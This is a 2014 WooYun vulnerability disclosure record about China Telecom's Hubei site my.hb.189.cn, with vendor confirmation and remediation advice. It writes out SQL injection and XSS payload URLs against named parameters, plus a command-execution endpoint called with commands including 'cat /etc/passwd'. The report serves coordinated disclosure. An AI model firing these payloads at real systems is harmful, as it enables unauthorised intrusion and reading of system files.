{"id": 52279, "wybug_id": "wooyun-2014-071779", "wybug_title": "续中国电信SQL注入&amp;XSS&amp;命令执行", "wybug_corp": "189.cn", "wybug_author": "sm0nk", "wybug_date": "2014-08-11 12:32", "wybug_open_date": "2014-09-25 12:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向公众公开  简要描述： 顺着弱口令继续开发研究，漏洞还有好多 详细说明：  1.刚才提交的是弱口令、目录遍历、物理路径泄漏2.自己分析了URL及参数提交过程，漏洞不少得修复3.SQL注入注入点如下：http://my.hb.189.cn:80/app/mobile/get_nums.php?card_type=0&city_code=10%20AND%203*2*1%3d6%20AND%20276%3d276&goods_name=GALAXY%20Note3%20SM-N9009&is_group=0&keywords=&num_id=&num_id_1=&num_id_2=&num_section=%E5%85%A8%E9%83%A8&page=1&per_num=24http://my.hb.189.cn:80/app/mobile/get_nums.php?card_type=1'%22&city_code=10&goods_name=GALAXY%20Note3%20SM-N9009&is_group=0&keywords=&num_id=&num_id_1=&num_id_2=&num_section=%E5%85%A8%E9%83%A8&page=1&per_num=24\n\n4. XSS http://my.hb.189.cn:80/index.php?act=store&app=search&cate_id=&keyword=1&order=credit_value%2520desc_</script><script>prompt(/xss/)</script>&region_id=1872&Submit=%e6%90%9c%e7%b4%a2&user_name=xdobxhvfhttp://my.hb.189.cn:80/app/mobile/get_nums.php?card_type=0&city_code=10'%22()%26%25<ScRiPt%20>prompt(965963)</ScRiPt>&goods_name=GALAXY%20Note3%20SM-N9009&is_group=0&keywords=&num_id=&num_id_1=&num_id_2=&num_section=%E5%85%A8%E9%83%A8&page=1&per_num=24http://my.hb.189.cn/index.php?act=qa&app=goods&id=10%22%20onmouseover%3dprompt(986678)%20bad%3d%22&page=1 \n\n\n\n第三个XSS在咨询留言处，需要鼠标滑过。\n\n5.命令执行漏洞http://my.hb.189.cn/tmpbigba.php?cmd=netstat%20-anhttp://my.hb.189.cn/tmpbigba.php?cmd=id\n\nhttp://my.hb.189.cn/tmpbigba.php?cmd=uname%20-ahttp://my.hb.189.cn/tmpbigba.php?cmd=cat%20/etc/passwd\n\n   漏洞证明：  如详细描述   修复方案：  #注入过滤掉/app/mobile/get_numbers.php 的city_code keywords num_id num_id_1 num_section card_type page per_number 等参数特殊字符的输入以及URLpost提交的过滤。#XSS过滤掉index.php下面的order id ,以及注入的URL的。反射性的XSS防不胜防，还有好多URL，请继续防护#命令执行1.权限不要太大2.限制对cmdURL直接访问3.daemon 在上线前安全检查的时候应该已经删除了默认帐号   版权声明：转载请注明来源 sm0nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-08-16 08:34 厂商回复：   最新状态： 2014-08-20：补充处置情况：CNVD确认并复现所述情况，已经转由CNCERT通报给中国电信集团公司处置。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}